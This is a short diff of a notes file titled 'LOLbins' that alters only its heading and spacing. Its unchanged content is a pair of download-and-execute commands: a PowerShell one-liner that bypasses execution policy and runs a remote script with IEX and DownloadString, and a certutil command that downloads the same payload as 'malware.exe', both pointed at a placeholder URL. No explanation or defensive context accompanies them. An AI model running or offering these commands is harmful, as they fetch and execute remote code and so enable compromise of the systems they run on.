@@ -1,10 +1,8 @@
 
 
-#LOLBIN
+LOLbins
 
 $MAL = 'http://example.com/malware.ps1'
-
 powershell.exe -NoP -NonI -Exec Bypass -Command `
 "IEX (New-Object System.Net.WebClient).DownloadString($MAL);"
-
 certutil.exe -urlcache -split -f $MAL "malware.exe"
